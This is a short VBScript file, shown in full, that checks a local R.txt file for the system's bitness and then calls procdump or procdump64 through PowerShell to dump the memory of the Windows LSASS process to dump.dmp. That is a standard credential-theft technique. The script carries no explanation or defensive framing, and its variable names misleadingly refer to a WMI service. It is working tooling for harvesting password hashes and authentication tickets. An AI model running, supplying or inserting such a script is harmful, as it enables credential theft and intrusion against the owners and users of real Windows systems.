Option Explicit

Dim objShell
Dim objFSO
Dim objTextFile
Dim strText
Dim strObjWMIService64
Dim strDOSCommand
Dim objExec
Dim strObjWMIService
Dim strDOSCommand2
Dim objExec2

Const ForReading = 1
Const sysName = "64-bit"
Const TriStateTrue = -1

Set objShell = CreateObject("Wscript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objTextFile = objFSO.OpenTextFile(".\R.txt", ForReading, False, TriStateTrue)


strText = objTextFile.ReadLine
objTextFile.Close


If strText = sysName Then
	
	strObjWMIService64 = ".\procdump64.exe -accepteula -ma lsass.exe dump.dmp 2>&1"

	strDOSCommand = "powershell -command " & strObjWMIService64 & ""

	objShell.Exec(strDOSCommand)

Else
	
	strObjWMIService = ".\procdump.exe -accepteula -ma lsass.exe dump.dmp 2>&1"

	strDOSCommand2 = "powershell -command " & strObjWMIService & ""

	objShell.Exec(strDOSCommand2)

End If
